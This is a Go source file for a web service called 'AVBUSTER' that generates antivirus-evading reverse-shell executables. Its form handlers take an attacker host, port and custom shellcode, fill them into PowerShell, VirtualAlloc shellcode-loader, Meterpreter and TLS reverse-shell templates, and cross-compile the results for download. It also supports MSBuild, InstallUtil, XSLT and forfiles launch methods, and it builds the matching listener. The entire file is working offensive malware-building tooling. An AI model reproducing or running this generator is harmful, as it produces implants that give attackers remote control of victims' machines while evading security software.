package main

import (
	"bufio"
	"bytes"
	"compress/flate"
	"encoding/json"
	"fmt"
	"html/template"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	"github.com/gorilla/mux"
)

type baseframe struct {
	Serverip string `json:"serverip"`
}

type DownloadLink struct {
	Link string
}

var appconfig baseframe
var dwnloadlink DownloadLink
var avbustertemplate, pstcprevshelltemplate, pscustomshellcodetemplate, msbuildtcprevshelltemplate, installshieldtcprevshelltemplate, msxmlxslttcprevshelltemplate, forfilestcprevshelltemplate *template.Template
var tcprevshelltemplate, hybridencrevshelltemplate, httprevshelltemplate, httpmetprshelltemplate, httpspinnedcertrevshelltemplate, httpsmetprshelltemplate, enccustomshellcodetemplate *template.Template

var basepath, outpath, exepath, exeoutpath, downloadlink string

func init() {
	appconfig = baseframe{}
	dwnloadlink = DownloadLink{}
	avbustertemplate = template.Must(template.ParseFiles("templates/avbuster.html"))
	pstcprevshelltemplate = template.Must(template.ParseFiles("templates/powershelltcpreverseshell.html"))
	pscustomshellcodetemplate = template.Must(template.ParseFiles("templates/powershellcustomshellcode.html"))
	msbuildtcprevshelltemplate = template.Must(template.ParseFiles("templates/msbuild.html"))
	installshieldtcprevshelltemplate = template.Must(template.ParseFiles("templates/installutil.html"))
	msxmlxslttcprevshelltemplate = template.Must(template.ParseFiles("templates/msxmlxslt.html"))
	forfilestcprevshelltemplate = template.Must(template.ParseFiles("templates/msforfiles.html"))

	tcprevshelltemplate = template.Must(template.ParseFiles("templates/tcprevshell.html"))
	hybridencrevshelltemplate = template.Must(template.ParseFiles("templates/hybridencshell.html"))
	httprevshelltemplate = template.Must(template.ParseFiles("templates/httprevshell.html"))
	httpmetprshelltemplate = template.Must(template.ParseFiles("templates/httpmeterpretershell.html"))
	httpspinnedcertrevshelltemplate = template.Must(template.ParseFiles("templates/httpspinnedcertrevshell.html"))
	httpsmetprshelltemplate = template.Must(template.ParseFiles("templates/httpsmeterpretershell.html"))
	enccustomshellcodetemplate = template.Must(template.ParseFiles("templates/customencryptedshell.html"))
}
func main() {
	fmt.Println("[AVBUSTER Service Status : Running]")
	fmt.Println("http://0.0.0.0:8085")
	startserver()
}

func avbusterpstcprevshell(httpw http.ResponseWriter, req *http.Request) {
	if req.Method == "GET" {
		err := pstcprevshelltemplate.Execute(httpw, nil)
		if err != nil {
			fmt.Println(err)
		}
	} else {
		err := req.ParseForm()
		saveas := req.Form.Get("saveas")
		if strings.TrimSpace(saveas) == "" {
			saveas = "noname"
		}
		if err != nil {
			fmt.Println(err)
		}

		rhost := req.Form.Get("rhost")
		rport := req.Form.Get("rport")

		createpsrevshellpayload(rhost, rport, saveas)
		time.Sleep(5000 * time.Millisecond)
		dwnloadlink.Link = "download/" + saveas + ".exe"
		os.Remove("outfiles/rev.go")
		err = pstcprevshelltemplate.Execute(httpw, dwnloadlink)
		if err != nil {
			fmt.Println(err)
		}
	}
}

func avbusterpscustomshellcode(httpw http.ResponseWriter, req *http.Request) {
	if req.Method == "GET" {
		err := pscustomshellcodetemplate.Execute(httpw, nil)
		if err != nil {
			fmt.Println(err)
		}
	} else {
		err := req.ParseForm()
		saveas := req.Form.Get("saveas")
		if strings.TrimSpace(saveas) == "" {
			saveas = "noname"
		}
		if err != nil {
			fmt.Println(err)
		}

		rhost := req.Form.Get("rhost")
		rport := req.Form.Get("rport")
		shellcode := req.Form.Get("shellcode")
		createpsvirtualallocpayload(rhost, rport, shellcode, saveas)
		time.Sleep(5000 * time.Millisecond)
		dwnloadlink.Link = "download/" + saveas + ".exe"
		os.Remove("outfiles/psvalloc.go")
		err = pscustomshellcodetemplate.Execute(httpw, dwnloadlink)
		if err != nil {
			fmt.Println(err)
		}
	}
}

func avbusterhttpmeterpretershell(httpw http.ResponseWriter, req *http.Request) {
	if req.Method == "GET" {
		err := httpsmetprshelltemplate.Execute(httpw, nil)
		if err != nil {
			fmt.Println(err)
		}
	} else {
		err := req.ParseForm()
		saveas := req.Form.Get("saveas")
		if strings.TrimSpace(saveas) == "" {
			saveas = "noname"
		}
		if err != nil {
			fmt.Println(err)
		}

		rhost := req.Form.Get("rhost")
		rport := req.Form.Get("rport")
		basepath = filepath.FromSlash("basefiles/gorevhttp.go")
		outpath = filepath.FromSlash("outfiles/gorevhttp.go")
		exepath = filepath.FromSlash("download/" + saveas + ".exe")
		exeoutpath = filepath.FromSlash("outfiles/gorevhttp.go")
		creategopayload(rhost+":"+rport, basepath, outpath, exepath, exeoutpath, "", "", "")
		dwnloadlink.Link = "download/" + saveas + ".exe"
		time.Sleep(5000 * time.Millisecond)
		os.Remove("outfiles/gorevhttp.go")
		err = httpsmetprshelltemplate.Execute(httpw, dwnloadlink)
		if err != nil {
			fmt.Println(err)
		}
	}
}

func avbusterhttpreverseshell(httpw http.ResponseWriter, req *http.Request) {
	if req.Method == "GET" {
		err := httprevshelltemplate.Execute(httpw, nil)
		if err != nil {
			fmt.Println(err)
		}
	} else {
		err := req.ParseForm()
		saveas := req.Form.Get("saveas")
		if strings.TrimSpace(saveas) == "" {
			saveas = "noname"
		}
		if err != nil {
			fmt.Println(err)
		}

		rhost := req.Form.Get("rhost")
		rport := req.Form.Get("rport")
		basepath = filepath.FromSlash("basefiles/gorevhttps.go")
		outpath = filepath.FromSlash("outfiles/gorevhttps.go")
		exepath = filepath.FromSlash("download/" + saveas + ".exe")
		exeoutpath = filepath.FromSlash("outfiles/gorevhttps.go")
		creategopayload(rhost+":"+rport, basepath, outpath, exepath, exeoutpath, "", "", "")
		dwnloadlink.Link = "download/" + saveas + ".exe"
		time.Sleep(5000 * time.Millisecond)
		os.Remove("outfiles/gorevhttps.go")
		err = httprevshelltemplate.Execute(httpw, dwnloadlink)
		if err != nil {
			fmt.Println(err)
		}

	}
}

func avbusterhttpsmeterpretershell(httpw http.ResponseWriter, req *http.Request) {
	if req.Method == "GET" {
		err := httpsmetprshelltemplate.Execute(httpw, nil)
		if err != nil {
			fmt.Println(err)
		}
	} else {
		err := req.ParseForm()
		saveas := req.Form.Get("saveas")
		if strings.TrimSpace(saveas) == "" {
			saveas = "noname"
		}
		if err != nil {
			fmt.Println(err)
		}

		rhost := req.Form.Get("rhost")
		rport := req.Form.Get("rport")
		basepath = filepath.FromSlash("basefiles/gorevhttps.go")
		outpath = filepath.FromSlash("outfiles/gorevhttps.go")
		exepath = filepath.FromSlash("download/" + saveas + ".exe")
		exeoutpath = filepath.FromSlash("outfiles/gorevhttps.go")
		creategopayload(rhost+":"+rport, basepath, outpath, exepath, exeoutpath, "", "", "")
		dwnloadlink.Link = "download/" + saveas + ".exe"
		time.Sleep(5000 * time.Millisecond)
		os.Remove("outfiles/gorevhttps.go")
		err = httpsmetprshelltemplate.Execute(httpw, dwnloadlink)
		if err != nil {
			fmt.Println(err)
		}

	}
}
func avbusterhttpsreverseshell(httpw http.ResponseWriter, req *http.Request) {
	if req.Method == "GET" {
		err := httpspinnedcertrevshelltemplate.Execute(httpw, nil)
		if err != nil {
			fmt.Println(err)
		}
	} else {
		err := req.ParseForm()
		saveas := req.Form.Get("saveas")
		if strings.TrimSpace(saveas) == "" {
			saveas = "noname"
		}
		if err != nil {
			fmt.Println(err)
		}

		rhost := req.Form.Get("rhost")
		rport := req.Form.Get("rport")
		basepath = filepath.FromSlash("basefiles/gorevhttps.go")
		outpath = filepath.FromSlash("outfiles/gorevhttps.go")
		exepath = filepath.FromSlash("download/" + saveas + ".exe")
		exeoutpath = filepath.FromSlash("outfiles/gorevhttps.go")
		creategopayload(rhost+":"+rport, basepath, outpath, exepath, exeoutpath, "", "", "")
		dwnloadlink.Link = "download/" + saveas + ".exe"
		time.Sleep(5000 * time.Millisecond)
		os.Remove("outfiles/gorevhttps.go")
		err = httpspinnedcertrevshelltemplate.Execute(httpw, dwnloadlink)
		if err != nil {
			fmt.Println(err)
		}

	}
}

func avbustermsbuildtcpreverseshell(httpw http.ResponseWriter, req *http.Request) {
	if req.Method == "GET" {
		err := msbuildtcprevshelltemplate.Execute(httpw, nil)
		if err != nil {
			fmt.Println(err)
		}
	} else {
		err := req.ParseForm()
		saveas := req.Form.Get("saveas")
		if strings.TrimSpace(saveas) == "" {
			saveas = "noname"
		}
		if err != nil {
			fmt.Println(err)
		}

		rhost := req.Form.Get("rhost")
		rport := req.Form.Get("rport")
		basepath = filepath.FromSlash("basefiles/gorevhttps.go")
		outpath = filepath.FromSlash("outfiles/gorevhttps.go")
		exepath = filepath.FromSlash("download/" + saveas + ".exe")
		exeoutpath = filepath.FromSlash("outfiles/gorevhttps.go")
		creategopayload(rhost+":"+rport, basepath, outpath, exepath, exeoutpath, "", "", "")
		dwnloadlink.Link = "download/" + saveas + ".exe"
		time.Sleep(5000 * time.Millisecond)
		os.Remove("outfiles/gorevhttps.go")
		err = msbuildtcprevshelltemplate.Execute(httpw, dwnloadlink)
		if err != nil {
			fmt.Println(err)
		}

	}
}
func avbusterinstallutiltcpreverseshell(httpw http.ResponseWriter, req *http.Request) {
	if req.Method == "GET" {
		err := installshieldtcprevshelltemplate.Execute(httpw, nil)
		if err != nil {
			fmt.Println(err)
		}
	} else {
		err := req.ParseForm()
		saveas := req.Form.Get("saveas")
		if strings.TrimSpace(saveas) == "" {
			saveas = "noname"
		}
		if err != nil {
			fmt.Println(err)
		}

		rhost := req.Form.Get("rhost")
		rport := req.Form.Get("rport")
		basepath = filepath.FromSlash("basefiles/gorevhttps.go")
		outpath = filepath.FromSlash("outfiles/gorevhttps.go")
		exepath = filepath.FromSlash("download/" + saveas + ".exe")
		exeoutpath = filepath.FromSlash("outfiles/gorevhttps.go")
		creategopayload(rhost+":"+rport, basepath, outpath, exepath, exeoutpath, "", "", "")
		dwnloadlink.Link = "download/" + saveas + ".exe"
		time.Sleep(5000 * time.Millisecond)
		os.Remove("outfiles/gorevhttps.go")
		err = installshieldtcprevshelltemplate.Execute(httpw, dwnloadlink)
		if err != nil {
			fmt.Println(err)
		}

	}
}
func avbustermsxmlxslttcpreverseshell(httpw http.ResponseWriter, req *http.Request) {
	if req.Method == "GET" {
		err := msxmlxslttcprevshelltemplate.Execute(httpw, nil)
		if err != nil {
			fmt.Println(err)
		}
	} else {
		err := req.ParseForm()
		saveas := req.Form.Get("saveas")
		if strings.TrimSpace(saveas) == "" {
			saveas = "noname"
		}
		if err != nil {
			fmt.Println(err)
		}

		rhost := req.Form.Get("rhost")
		rport := req.Form.Get("rport")
		basepath = filepath.FromSlash("basefiles/gorevhttps.go")
		outpath = filepath.FromSlash("outfiles/gorevhttps.go")
		exepath = filepath.FromSlash("download/" + saveas + ".exe")
		exeoutpath = filepath.FromSlash("outfiles/gorevhttps.go")
		creategopayload(rhost+":"+rport, basepath, outpath, exepath, exeoutpath, "", "", "")
		dwnloadlink.Link = "download/" + saveas + ".exe"
		time.Sleep(5000 * time.Millisecond)
		os.Remove("outfiles/gorevhttps.go")
		err = msxmlxslttcprevshelltemplate.Execute(httpw, dwnloadlink)
		if err != nil {
			fmt.Println(err)
		}

	}
}
func avbusterforfilestcpreverseshell(httpw http.ResponseWriter, req *http.Request) {
	if req.Method == "GET" {
		err := forfilestcprevshelltemplate.Execute(httpw, nil)
		if err != nil {
			fmt.Println(err)
		}
	} else {
		err := req.ParseForm()
		saveas := req.Form.Get("saveas")
		if strings.TrimSpace(saveas) == "" {
			saveas = "noname"
		}
		if err != nil {
			fmt.Println(err)
		}

		rhost := req.Form.Get("rhost")
		rport := req.Form.Get("rport")
		basepath = filepath.FromSlash("basefiles/gorevhttps.go")
		outpath = filepath.FromSlash("outfiles/gorevhttps.go")
		exepath = filepath.FromSlash("download/" + saveas + ".exe")
		exeoutpath = filepath.FromSlash("outfiles/gorevhttps.go")
		creategopayload(rhost+":"+rport, basepath, outpath, exepath, exeoutpath, "", "", "")
		dwnloadlink.Link = "download/" + saveas + ".exe"
		time.Sleep(5000 * time.Millisecond)
		os.Remove("outfiles/gorevhttps.go")
		err = forfilestcprevshelltemplate.Execute(httpw, dwnloadlink)
		if err != nil {
			fmt.Println(err)
		}

	}
}
func avbusterencryptedcustomshell(httpw http.ResponseWriter, req *http.Request) {
	if req.Method == "GET" {
		err := enccustomshellcodetemplate.Execute(httpw, nil)
		if err != nil {
			fmt.Println(err)
		}
	} else {
		err := req.ParseForm()
		saveas := req.Form.Get("saveas")
		if strings.TrimSpace(saveas) == "" {
			saveas = "noname"
		}
		if err != nil {
			fmt.Println(err)
		}

		rhost := req.Form.Get("rhost")
		rport := req.Form.Get("rport")
		basepath = filepath.FromSlash("basefiles/gorevhttps.go")
		outpath = filepath.FromSlash("outfiles/gorevhttps.go")
		exepath = filepath.FromSlash("download/" + saveas + ".exe")
		exeoutpath = filepath.FromSlash("outfiles/gorevhttps.go")
		creategopayload(rhost+":"+rport, basepath, outpath, exepath, exeoutpath, "", "", "")
		dwnloadlink.Link = "download/" + saveas + ".exe"
		time.Sleep(5000 * time.Millisecond)
		os.Remove("outfiles/gorevhttps.go")
		err = enccustomshellcodetemplate.Execute(httpw, dwnloadlink)
		if err != nil {
			fmt.Println(err)
		}

	}
}

func avbustertcpreverseshell(httpw http.ResponseWriter, req *http.Request) {
	if req.Method == "GET" {
		err := tcprevshelltemplate.Execute(httpw, nil)
		if err != nil {
			fmt.Println(err)
		}
	} else {
		err := req.ParseForm()
		saveas := req.Form.Get("saveas")
		if strings.TrimSpace(saveas) == "" {
			saveas = "noname"
		}
		if err != nil {
			fmt.Println(err)
		}

		rhost := req.Form.Get("rhost")
		rport := req.Form.Get("rport")
		var archtype string
		shelltype := req.Form.Get("shelltype")
		ostype := strings.ToLower(req.Form.Get("ostype"))
		if req.Form.Get("archtype") == "32" {
			archtype = "386"
		} else {
			archtype = "amd64"
		}
		fmt.Println(archtype)

		fprint := req.Form.Get("fingerprint")

		if ostype == "windows" {
			exepath = filepath.FromSlash("download/" + saveas + ".exe")
			downloadlink = "download/" + saveas + ".exe"
		} else {
			exepath = filepath.FromSlash("download/" + saveas)
			downloadlink = "download/" + saveas
		}

		if shelltype == "TCP" {
			basepath = filepath.FromSlash("basefiles/gorevcmd.go")
			outpath = filepath.FromSlash("outfiles/gorevcmd.go")
			exeoutpath = filepath.FromSlash("outfiles/gorevcmd.go")
			createrevgoshell("manager/tcprev.go", "outfiles/tcprev.go", rport, false)
		} else if shelltype == "TCP/TLS(PinnedCert)" {
			basepath = filepath.FromSlash("basefiles/mask.go")
			outpath = filepath.FromSlash("outfiles/mask.go")
			exeoutpath = filepath.FromSlash("outfiles/mask.go")
			createrevgoshell("manager/tcptlsrev.go", "outfiles/tcptlsrev.go", rport, true)
		} else if shelltype == "HTTPS" {
			basepath = filepath.FromSlash("basefiles/shadow.go")
			outpath = filepath.FromSlash("outfiles/shadow.go")
			exeoutpath = filepath.FromSlash("outfiles/shadow.go")
			createrevgoshell("manager/httpsrev.go", "outfiles/httpsrev.go", rport, true)
		}
		creategopayload(rhost+":"+rport, basepath, outpath, exepath, exeoutpath, ostype, archtype, fprint)

		time.Sleep(5000 * time.Millisecond)
		dwnloadlink.Link = downloadlink
		err = tcprevshelltemplate.Execute(httpw, dwnloadlink)
		if err != nil {
			fmt.Println(err)
		}
		/*gofiles, err := filepath.Glob("outfiles/*.go")
		if err != nil {
			fmt.Println(err)
		}
		for _, f := range gofiles {
			if err := os.Remove(f); err != nil {
				fmt.Println(err)
			}
		}*/
		//os.Remove("outfiles/gorevcmd.go")

	}
}

func avbusterhomepage(httpw http.ResponseWriter, req *http.Request) {
	if req.Method == "GET" {
		err := avbustertemplate.Execute(httpw, nil)
		if err != nil {
			fmt.Println(err)
		}
	}
}

func startserver() {
	router := mux.NewRouter()
	router.HandleFunc("/", avbusterhomepage)
	router.HandleFunc("/powershelltcpreverseshell", avbusterpstcprevshell)
	router.HandleFunc("/powershellcustomshellcode", avbusterpscustomshellcode)
	router.HandleFunc("/msbuild", avbustermsbuildtcpreverseshell)
	router.HandleFunc("/msxmlxslt", avbustermsxmlxslttcpreverseshell)
	router.HandleFunc("/installutil", avbusterinstallutiltcpreverseshell)
	router.HandleFunc("/msforfiles", avbusterforfilestcpreverseshell)
	router.HandleFunc("/tcprevshell", avbusterpstcprevshell)
	router.HandleFunc("/hybridencshell", avbusterpstcprevshell)
	router.HandleFunc("/httprevshell", avbusterhttpreverseshell)
	router.HandleFunc("/httpmeterpretershell", avbusterhttpmeterpretershell)
	router.HandleFunc("/httpspinnedcertrevshell", avbusterhttpsreverseshell)
	router.HandleFunc("/httpsmeterpretershell", avbusterhttpsmeterpretershell)
	router.HandleFunc("/customencryptedshell", avbusterencryptedcustomshell)

	router.PathPrefix("/static/css/").Handler(http.StripPrefix("/static/css/", http.FileServer(http.Dir("static/css/"))))
	router.PathPrefix("/download/").Handler(http.StripPrefix("/download/", http.FileServer(http.Dir("download/"))))
	router.PathPrefix("/outfiles/").Handler(http.StripPrefix("/outfiles/", http.FileServer(http.Dir("outfiles/"))))

	srv := &http.Server{
		Handler: router,
		Addr:    "0.0.0.0:8085",
		// Good practice: enforce timeouts for servers you create!
		WriteTimeout: 180 * time.Second,
		ReadTimeout:  180 * time.Second,
	}
	srv.ListenAndServe()
}

func fillappconfig() {
	apifile, err := ioutil.ReadFile("config/appconfig.cfg")
	if err != nil {
		fmt.Println(err)
	}
	err = json.Unmarshal(apifile, &appconfig)
	if err != nil {
		fmt.Println(err)
	}

}

func buildrevshellexe(exepath, gofilepath, ostype, arch string) {
	if runtime.GOOS == "linux" {
		cmdpath, _ := exec.LookPath("bash")
		var execargs string
		execargs = "GOOS=" + ostype + " GOARCH=" + arch + " go build -o " + exepath + " " + gofilepath

		//fmt.Println(execargs)
		cmd := exec.Command(cmdpath, "-c", execargs)
		err := cmd.Start()
		cmd.Wait()
		if err != nil {
			fmt.Println(err)
		} else {
			fmt.Println(exepath)
			//fmt.Println(gofilepath)
			fmt.Println("Build Success !")
		}
	} else {
		//fmt.Println("About to build " + gofilepath)
		//to do implement architecture base binary build
		cmd := exec.Command("go", "build", "-o", exepath, gofilepath)
		err := cmd.Start()
		cmd.Wait()
		if err != nil {
			fmt.Println(err)
		} else {
			fmt.Println(exepath)
			//fmt.Println(gofilepath)
			fmt.Println("Build Success !")
		}
	}
}

func buildexe(exepath string, gofilepath string) {
	if runtime.GOOS == "linux" {
		cmdpath, _ := exec.LookPath("bash")
		execargs := "GOOS=windows GOARCH=386 go build -o " + exepath + " " + gofilepath
		fmt.Println(execargs)
		cmd := exec.Command(cmdpath, "-c", execargs)
		err := cmd.Start()
		cmd.Wait()
		if err != nil {
			fmt.Println(err)
		} else {
			fmt.Println(exepath)
			//fmt.Println(gofilepath)
			fmt.Println("Build Success !")
		}
	} else {
		cmd := exec.Command("go", "build", "-o", exepath, gofilepath)
		err := cmd.Start()
		cmd.Wait()
		if err != nil {
			fmt.Println(err)
		} else {
			fmt.Println(exepath)
			//fmt.Println(gofilepath)
			fmt.Println("Build Success !")
		}
	}
}

func buildrevshellexeforpscript() {
	cmd := exec.Command("go", "build", "-o", "download/rev.exe", "outfiles/rev.go")
	err := cmd.Start()
	cmd.Wait()
	if err != nil {
		fmt.Println(err)

	}
	//finflag <- "exe generated"
}

func shellexeccompress(source string) []byte {
	w, _ := flate.NewWriter(nil, 7)
	buf := new(bytes.Buffer)
	w.Reset(buf)
	w.Write([]byte(source))
	w.Close()
	return buf.Bytes()
}

func readandreplacefilecontent(ipport string) string {
	baseframefile, err := os.Open("basefiles/encode.txt")
	if err != nil {
		log.Fatal(err)
	}
	defer baseframefile.Close()

	/*newgoFile, err := os.Create("outfiles/rev.go")
	if err != nil {
		log.Fatal(err)
	}
	defer newgoFile.Close()*/
	filestring := ""
	baseframescanner := bufio.NewScanner(baseframefile)
	for baseframescanner.Scan() {
		str := baseframescanner.Text()
		if strings.Contains(str, "IP:PORT") {
			//fmt.Println(str)
			str = strings.Replace(str, "IP:PORT", ipport, 1)
		}
		filestring += str
		filestring += "\n"
	}

	if err := baseframescanner.Err(); err != nil {
		log.Fatal(err)
	}
	return filestring
}

func createpsrevgofile() {
	baseframefile, err := os.Open("basefiles/psrevcmd.go")
	if err != nil {
		log.Fatal(err)
	}
	defer baseframefile.Close()

	newgoFile, err := os.Create("outfiles/rev.go")
	if err != nil {
		log.Fatal(err)
	}
	defer newgoFile.Close()

	baseframescanner := bufio.NewScanner(baseframefile)
	for baseframescanner.Scan() {
		str := baseframescanner.Text()
		if strings.Contains(str, "SERVERIP") {
			str = strings.Replace(str, "SERVERIP", appconfig.Serverip, 1)
		}
		newgoFile.WriteString(str + "\n")
	}

	if err := baseframescanner.Err(); err != nil {
		log.Fatal(err)
	}

}

func createpsvallocgofile() {
	baseframefile, err := os.Open("basefiles/psvalloc.go")
	if err != nil {
		log.Fatal(err)
	}
	defer baseframefile.Close()

	newgoFile, err := os.Create("outfiles/psvalloc.go")
	if err != nil {
		log.Fatal(err)
	}
	defer newgoFile.Close()

	baseframescanner := bufio.NewScanner(baseframefile)
	for baseframescanner.Scan() {
		str := baseframescanner.Text()
		if strings.Contains(str, "SERVERIP") {
			str = strings.Replace(str, "SERVERIP", appconfig.Serverip, 1)
		}
		newgoFile.WriteString(str + "\n")
	}

	if err := baseframescanner.Err(); err != nil {
		log.Fatal(err)
	}

}

func createencodepsvallocgofile() {
	baseframefile, err := os.Open("basefiles/psencodevalloc.go")
	if err != nil {
		log.Fatal(err)
	}
	defer baseframefile.Close()

	newgoFile, err := os.Create("outfiles/psencodevalloc.go")
	if err != nil {
		log.Fatal(err)
	}
	defer newgoFile.Close()

	baseframescanner := bufio.NewScanner(baseframefile)
	for baseframescanner.Scan() {
		str := baseframescanner.Text()
		if strings.Contains(str, "SERVERIP") {
			str = strings.Replace(str, "SERVERIP", appconfig.Serverip, 1)
		}
		newgoFile.WriteString(str + "\n")
	}

	if err := baseframescanner.Err(); err != nil {
		log.Fatal(err)
	}

}

func createencodedpsvirtualallocpayload(shellcode, saveas string) {
	file, err := os.Open("basefiles/vallocencode.ps1")
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	newFile, err := os.Create("outfiles/vallocencode.ps1")
	if err != nil {
		log.Fatal(err)
	}
	defer newFile.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		str := scanner.Text()
		if strings.Contains(str, "SHELLCODE") {
			str = strings.Replace(str, "SHELLCODE", shellcode, 1)
		}
		newFile.WriteString(str + "\n")
	}
	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}
	createencodepsvallocgofile()
	buildexe("download/"+saveas+".exe", "outfiles/psencodevalloc.go")
}

func createpsvirtualallocpayload(rhost, rport, shellcode, saveas string) {
	file, err := os.Open("basefiles/virtualalloc.ps1")
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	newFile, err := os.Create("outfiles/psvalloc.ps1")
	if err != nil {
		log.Fatal(err)
	}
	defer newFile.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		str := scanner.Text()
		if strings.Contains(str, "SHELLCODE") {
			str = strings.Replace(str, "SHELLCODE", shellcode, 1)
		}
		newFile.WriteString(str + "\n")
	}

	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}
	createpsvallocgofile()
	buildexe("download/"+saveas+".exe", "outfiles/psvalloc.go")
}

func createavbusterpayload(ipandport, binarytemplate, outfilepath, downloadlink, ostype, archtype, fprint string) {

	ipandportreplaced := strings.Replace(binarytemplate, "REVIPPORT", ipandport, 1)
	finalval := strings.Replace(ipandportreplaced, "FPRINT", fprint, 1)

	newFile, err := os.Create(outfilepath)
	if err != nil {
		log.Fatal(err)
	}
	defer newFile.Close()
	newFile.WriteString(finalval)

	if ostype != "" && archtype != "" {
		//fmt.Println("bulding " + downloadlink)
		//fmt.Println("buiulding " + sourcefilelink)
		buildrevshellexe(downloadlink, outfilepath, ostype, archtype)
	} else {
		buildexe(downloadlink, outfilepath)
	}
}

// creategopayload("basefiles/gorevhttp.go","outfiles/gorevhttp.go","download/gorevhttp.exe","outfiles/gorevhttp.go")
func creategopayload(ipandport, basefilepath, outfilepath, downloadlink, sourcefilelink, ostype, archtype, fprint string) {
	file, err := os.Open(basefilepath)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	newFile, err := os.Create(outfilepath)
	if err != nil {
		log.Fatal(err)
	}
	defer newFile.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		str := scanner.Text()
		if strings.Contains(str, "REVIPPORT") {
			str = strings.Replace(str, "REVIPPORT", ipandport, 1)
		}
		if strings.Contains(str, "FPRINT") {
			str = strings.Replace(str, "FPRINT", fprint, 1)
		}
		newFile.WriteString(str + "\n")
	}

	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}
	if ostype != "" && archtype != "" {
		//fmt.Println("bulding " + downloadlink)
		//fmt.Println("buiulding " + sourcefilelink)
		buildrevshellexe(downloadlink, sourcefilelink, ostype, archtype)
	} else {
		buildexe(downloadlink, sourcefilelink)
	}
}

func copyfile(sourcepath, destpath string) {
	srcpubkfile, err := os.Open(sourcepath)
	if err != nil {
		fmt.Println(err)
	}
	defer srcpubkfile.Close()
	newpubkFile, err := os.Create(destpath)
	if err != nil {
		fmt.Println(err)
	}
	defer newpubkFile.Close()

	scanner := bufio.NewScanner(srcpubkfile)
	for scanner.Scan() {
		str := scanner.Text()

		newpubkFile.WriteString(str + "\n")
	}

	if err = scanner.Err(); err != nil {
		log.Fatal(err)
	}
}

func createrevgoshell(revshellfilepath, outfilepath, port string, copycerts bool) {
	if copycerts {
		copyfile("manager/server.crt", "download/server.crt")
		copyfile("manager/server.key", "download/server.key")
	}

	file, err := os.Open(revshellfilepath)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	newFile, err := os.Create(outfilepath)
	if err != nil {
		log.Fatal(err)
	}
	defer newFile.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		str := scanner.Text()
		if strings.Contains(str, "REVPRT") {
			str = strings.Replace(str, "REVPRT", port, 1)
		}
		newFile.WriteString(str + "\n")
	}

	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}
	//buildexe("download/"+"tcprev"+".exe", "outfiles/rev.go")

	if runtime.GOOS == "linux" {
		cmdpath, _ := exec.LookPath("bash")
		var execargs string
		execargs = "go build -o download/tcprev " + outfilepath

		//fmt.Println(execargs)
		cmd := exec.Command(cmdpath, "-c", execargs)
		err := cmd.Start()
		//cmd.Wait()
		if err != nil {
			fmt.Println(err)
		} else {
			fmt.Println(exepath)
			//fmt.Println(gofilepath)
			fmt.Println("Server is ready !")
		}
	} else {
		//fmt.Println("About to build " + gofilepath)
		cmd := exec.Command("go", "build", "-o", "download/tcprev.exe", outfilepath)
		err := cmd.Start()
		//cmd.Wait()
		if err != nil {
			fmt.Println(err)
		} else {
			fmt.Println(exepath)
			//fmt.Println(gofilepath)
			fmt.Println("Server is ready !")
		}
	}

}

func creategorevhttppayload(ipandport string) {
	file, err := os.Open("basefiles/gorevhttp.go")
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	newFile, err := os.Create("outfiles/gorevhttp.go")
	if err != nil {
		log.Fatal(err)
	}
	defer newFile.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		str := scanner.Text()
		if strings.Contains(str, "REVIPPORT") {
			str = strings.Replace(str, "REVIPPORT", ipandport, 1)
		}
		newFile.WriteString(str + "\n")
	}

	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}
	buildexe("download/gorevhttp.exe", "outfiles/gorevhttp.go")
}
func createpsrevshellpayload(rhost, rport, saveas string) {
	file, err := os.Open("basefiles/psrevcmd.ps1")
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	newFile, err := os.Create("outfiles/revpshell.ps1")
	if err != nil {
		log.Fatal(err)
	}
	defer newFile.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		str := scanner.Text()
		if strings.Contains(str, "IPADDRHERE") {
			str = strings.Replace(str, "IPADDRHERE", rhost, 1)
		} else if strings.Contains(str, "PORTHERE") {
			str = strings.Replace(str, "PORTHERE", rport, 1)
		}
		newFile.WriteString(str + "\n")
	}

	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}
	createpsrevgofile()
	buildexe("download/"+saveas+".exe", "outfiles/rev.go")
	//buildrevshellexeforpscript()
	//finflag <- "finished pscriptexe"
}
